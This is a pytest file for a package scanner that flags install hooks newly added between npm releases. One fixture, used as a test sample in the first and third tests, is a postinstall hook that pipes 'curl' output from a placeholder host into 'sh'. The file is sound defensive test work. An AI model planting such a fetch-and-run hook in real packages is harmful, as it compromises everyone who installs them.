"""What a release adds over the release before it."""

from __future__ import annotations

import io
import json
import tarfile
from pathlib import Path

from cordon_scanner import Scanner
from cordon_scanner.core import release_diff
from cordon_scanner.core.config import Config


def _npm(
    path: Path, version: str, files: dict[str, str], scripts: dict[str, str] | None = None
) -> Path:
    manifest = {"name": "demo-lib", "version": version, "main": "index.js"}
    if scripts:
        manifest["scripts"] = scripts
    members = {
        "package/package.json": json.dumps(manifest),
        **{f"package/{k}": v for k, v in files.items()},
    }
    with tarfile.open(path, "w:gz") as archive:
        for name, body in members.items():
            data = body.encode()
            info = tarfile.TarInfo(name)
            info.size = len(data)
            archive.addfile(info, io.BytesIO(data))
    return path


def _changes(new: Path, old: Path) -> set[str]:
    scanner = Scanner(Config.default().with_overrides(use_cache=False))
    return {
        c.rule_id
        for c in release_diff.compare(
            release_diff.Profile.of(scanner.scan(new)),
            release_diff.Profile.of(scanner.scan(old)),
            previous="demo-lib 1.0.0",
        )
    }


SAFE = {"index.js": "module.exports = (a, b) => a + b;\n"}
HOOK = 'require("child_process").execSync("curl -s https://x.invalid/p | sh");\n'


def test_a_new_install_hook_is_reported(tmp_path) -> None:
    old = _npm(tmp_path / "a.tgz", "1.0.0", SAFE)
    new = _npm(
        tmp_path / "b.tgz", "1.0.1", {**SAFE, "setup.js": HOOK}, {"postinstall": "node setup.js"}
    )
    assert {release_diff.RELEASE_NEW_HOOK, release_diff.RELEASE_NEW_CAPABILITY} <= _changes(
        new, old
    )


def test_an_unchanged_release_adds_nothing(tmp_path) -> None:
    old = _npm(tmp_path / "a.tgz", "1.0.0", SAFE)
    new = _npm(tmp_path / "b.tgz", "1.0.1", {**SAFE, "README.md": "# demo\n"})
    assert _changes(new, old) == set()


def test_a_hook_both_releases_have_is_not_new(tmp_path) -> None:
    files = {**SAFE, "setup.js": HOOK}
    old = _npm(tmp_path / "a.tgz", "1.0.0", files, {"postinstall": "node setup.js"})
    new = _npm(tmp_path / "b.tgz", "1.0.1", files, {"postinstall": "node setup.js"})
    assert release_diff.RELEASE_NEW_HOOK not in _changes(new, old)


def test_versioned_roots_compare_equal() -> None:
    assert release_diff.member("x-1.0.0.tar.gz!x-1.0.0/setup.py") == "setup.py"
    assert release_diff.member("x-1.1.0.tar.gz!x-1.1.0/setup.py") == "setup.py"
    assert release_diff.member("pkg.tgz!package/index.js") == "package/index.js"


def test_identity_from_an_npm_tarball(tmp_path) -> None:
    from cordon_scanner.sources.previous import identify

    identity = identify(_npm(tmp_path / "a.tgz", "2.3.4", SAFE))
    assert identity is not None and (identity.ecosystem, identity.name, identity.version) == (
        "npm",
        "demo-lib",
        "2.3.4",
    )
